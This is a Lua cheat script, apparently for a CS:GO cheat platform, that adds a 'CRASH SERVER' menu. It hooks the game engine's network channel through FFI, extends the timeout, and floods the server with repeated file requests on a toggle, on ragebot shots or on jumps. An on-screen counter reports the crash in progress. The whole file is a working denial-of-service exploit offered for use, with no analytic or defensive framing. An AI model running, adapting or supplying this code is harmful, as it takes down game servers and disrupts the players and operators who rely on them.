local crashs = Menu.Switch('Crash', "CRASH SERVER", false)
local crashslider = Menu.SliderInt('Crash', "Packets", 1,1,150)
local crashtriggers = Menu.MultiCombo("Crash", "Triggers", {"ragebot shot", "in air"}, 0)
local indicatorcrash = Menu.Switch("Crash", "Indicator", false)
local consolecrash = Menu.Switch("Crash", "Console Logs", false)
local ishotomg = false
local isinairomg = false
Cheat.RegisterCallback('events', function(event)
    if not crashtriggers:GetBool(2) then
        isinairomg = false
        return
    else
    if event:GetName() == "player_jump" then
        isinairomg = true
    end
end
end)
local ffi = require('ffi')
ffi.cdef[[
    typedef void*(__thiscall* getnetchannel_t)(void*); // engineclient 78

    typedef void(__thiscall* set_timeout_t)(void*, float, bool); // netchan 31
    typedef unsigned int(__thiscall* request_file_t)(void*, const char*, bool); // netchan 62

    void* GetProcAddress(void* hModule, const char* lpProcName);
    void* GetModuleHandleA(const char* lpModuleName);
    
    typedef struct {
        uint8_t r;
        uint8_t g;
        uint8_t b;
        uint8_t a;
    } color_struct_t;

    typedef void (*console_color_print)(const color_struct_t&, const char*, ...);

    typedef void* (__thiscall* get_client_entity_t)(void*, int);
]]

local ffi_helpers = {
    color_print_fn = ffi.cast("console_color_print", ffi.C.GetProcAddress(ffi.C.GetModuleHandleA("tier0.dll"), "?ConColorMsg@@YAXABVColor@@PBDZZ")),
    color_print = function(self, text, color)
        local col = ffi.new("color_struct_t")

        col.r = color.r * 255
        col.g = color.g * 255
        col.b = color.b * 255
        col.a = color.a * 255

        self.color_print_fn(col, text)
    end
}

local function coloredPrint(color, text)
	ffi_helpers.color_print(ffi_helpers, text, color)
end

local engineclient = ffi.cast(ffi.typeof("void***"), Utils.CreateInterface("engine.dll", "VEngineClient014"))
local getnetchannel = ffi.cast("getnetchannel_t", engineclient[0][78])

local netchannel = {}
do
    function vfunc_wrapper(type, index)
        return function(...)
            -- only did this for netchannel, you can probably extend it to make it a proper wrapper
            local netchannel = ffi.cast(ffi.typeof("void***"), getnetchannel(engineclient))
            local fn = ffi.cast(type, ffi.cast('int(__fastcall*)(const char*, const char*)', Utils.PatternScan('engine.dll', index)))

            return fn(netchannel, ...)
        end
    end

    netchannel.set_timeout = vfunc_wrapper("set_timeout_t", '55 8B EC 80 7D 0C 00 F3')
    netchannel.request_file = vfunc_wrapper("request_file_t", '55 8B EC 83 EC 3C 56 8B F1 FF ? ? ? ? ? 8B')
end
local packetcount = 0
Cheat.RegisterCallback("createmove", function()
    netchannel.set_timeout(3600, false);
    if isinairomg then
        for i=1,crashslider:GetInt() do
            netchannel.request_file(".txt", false);
        end
        isinairomg = false
    end
end)
Cheat.RegisterCallback('ragebot_shot', function()
    netchannel.set_timeout(3600, false);
    if crashtriggers:GetBool(1) then
        for i=1,crashslider:GetInt() do
            netchannel.request_file(".txt", false);
        end
    end
end)
Cheat.RegisterCallback("createmove", function()
    netchannel.set_timeout(3600, false);
    if crashs:GetBool() then
        for i=1,crashslider:GetInt() do
            netchannel.request_file(".txt", false);
            packetcount = packetcount + 1
        end
    else
        packetcount = 0
    end
end)
Cheat.RegisterCallback("draw", function()
    -- netchannel.set_timeout(3600, false);
    if crashs:GetBool() then
        if indicatorcrash:GetBool() then
            Render.Text("Crashing [" .. packetcount .."]", Vector2.new(25, 550), Color.new(0, 1, 0, 1), 24, true)
        end
        if consolecrash:GetBool() then
            coloredPrint(Color.new(1, 0, 1, 1), "[+] crashing server...\n")
        end
    end
end)